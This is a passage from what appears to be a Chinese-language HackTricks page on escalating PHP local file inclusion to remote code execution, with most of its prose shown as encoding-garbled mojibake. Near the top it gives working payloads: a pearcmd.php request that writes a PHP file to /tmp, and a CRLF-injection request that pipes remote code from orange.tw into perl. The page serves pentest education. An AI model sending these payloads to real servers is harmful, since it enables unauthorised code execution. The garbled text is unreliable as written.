```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
{% endcode %}

ä»¥ä¸‹åˆ©ç”¨CRLFæ¼æ´è·å–RCEï¼ˆæ¥è‡ª[**è¿™é‡Œ**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)ï¼‰ï¼š
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### é€šè¿‡ phpinfo() (file\_uploads = on)

å¦‚æœä½ å‘ç°äº† **Local File Inclusion** å¹¶ä¸”æœ‰ä¸€ä¸ªæš´éœ² **phpinfo()** çš„æ–‡ä»¶ï¼Œä¸” file\_uploads = onï¼Œä½ å¯ä»¥è·å¾— RCEï¼š

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### é€šè¿‡ compress.zlib + `PHP_STREAM_PREFER_STUDIO` + è·¯å¾„æ³„éœ²

å¦‚æœä½ å‘ç°äº† **Local File Inclusion** å¹¶ä¸”ä½  **å¯ä»¥æå–ä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„**ï¼Œä½† **æœåŠ¡å™¨** æ­£åœ¨ **æ£€æŸ¥** è¦åŒ…å«çš„ **æ–‡ä»¶æ˜¯å¦æœ‰ PHP æ ‡è®°**ï¼Œä½ å¯ä»¥å°è¯•é€šè¿‡è¿™ä¸ª **ç«äº‰æ¡ä»¶** æ¥ **ç»•è¿‡è¯¥æ£€æŸ¥**ï¼š

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### é€šè¿‡æ°¸æ’ç­‰å¾… + æš´åŠ›ç ´è§£

å¦‚æœä½ å¯ä»¥åˆ©ç”¨ LFI æ¥ **ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶** å¹¶ä½¿æœåŠ¡å™¨ **æŒ‚èµ·** PHP æ‰§è¡Œï¼Œä½ å¯ä»¥ **åœ¨æ•°å°æ—¶å†…æš´åŠ›ç ´è§£æ–‡ä»¶å** ä»¥æ‰¾åˆ°ä¸´æ—¶æ–‡ä»¶ï¼š

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### åˆ°è‡´å‘½é”™è¯¯

å¦‚æœä½ åŒ…å«ä»»ä½•æ–‡ä»¶ `/usr/bin/phar`ã€`/usr/bin/phar7`ã€`/usr/bin/phar.phar7`ã€`/usr/bin/phar.phar`ã€‚ (ä½ éœ€è¦åŒ…å«åŒä¸€ä¸ªæ–‡ä»¶ä¸¤æ¬¡ä»¥å¼•å‘è¯¥é”™è¯¯)ã€‚

**æˆ‘ä¸çŸ¥é“è¿™æœ‰ä»€ä¹ˆç”¨ï¼Œä½†å¯èƒ½ä¼šæœ‰ç”¨ã€‚**\
_å³ä½¿ä½ å¯¼è‡´ PHP è‡´å‘½é”™è¯¯ï¼Œä¸Šä¼ çš„ PHP ä¸´æ—¶æ–‡ä»¶ä¹Ÿä¼šè¢«åˆ é™¤ã€‚_

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## å‚è€ƒ

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘å‘å¸ƒå’Œé‡è¦å¹³å°æ›´æ–°

**åŠ å…¥æˆ‘ä»¬** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ï¼Œä»Šå¤©å°±å¼€å§‹ä¸é¡¶çº§é»‘å®¢åˆä½œï¼

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
